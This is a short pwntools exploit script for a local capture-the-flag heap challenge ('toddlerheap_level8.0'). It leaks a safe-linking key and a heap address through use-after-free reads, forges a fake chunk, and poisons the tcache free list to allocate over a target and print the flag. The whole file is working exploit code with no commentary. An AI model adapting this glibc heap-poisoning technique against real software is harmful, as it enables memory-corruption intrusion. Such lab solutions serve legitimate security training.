from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process("/challenge/toddlerheap_level8.0")
offset=2144

def malloc(idx,size):
    p.sendline("malloc "+str(idx)+" "+str(size))
def free(idx):
    p.sendline("free "+str(idx))
def puts(idx):
    p.sendline("puts "+str(idx))
def qt():
    p.sendline("quit")
def read(idx,payload):
    p.sendline("safer_read "+str(idx))
    p.recvuntil("read",drop=True)
    print(p.recvline())
    p.send(payload)
    print(p.recv())
def read_flag():
    p.sendline("read_flag")
def global_read(idx,payload):
    p.sendline("read_copy "+str(idx))
    p.send(payload)

malloc(0,0)
malloc(1,0)
free(1)
free(0)
malloc(0,0)
malloc(1,0)
puts(1)
p.recvuntil("Data: ",drop=True)
pos=u64(p.recvuntil("\n",drop=True).ljust(8,b'\x00'))
print("[LEAK]:pos=",hex(pos))
puts(0)
p.recvuntil("Data: ",drop=True)
heap=u64(p.recvuntil("\n",drop=True).ljust(8,b'\x00'))^pos
print("[LEAK]:heap=",hex(heap))

malloc(2,0x38)
malloc(4,0xF8)
for i in range(7,14):
    malloc(i,0xF8)
for i in range(7,14):
    free(i)
payload1=p64(0)+p64(0x30)+p64(heap+32)+p64(heap+32)+p64(0)*2+p64(0x30)
global_read(2,payload1)
free(4)
malloc(5,0x30)
malloc(6,0x30)
free(6)
free(5)
global_read(2,b'a'*16+p64(pos^(heap+offset)))
malloc(5,0x30)
malloc(5,0x30)
read_flag()
puts(5)
print(p.recvall())
qt()
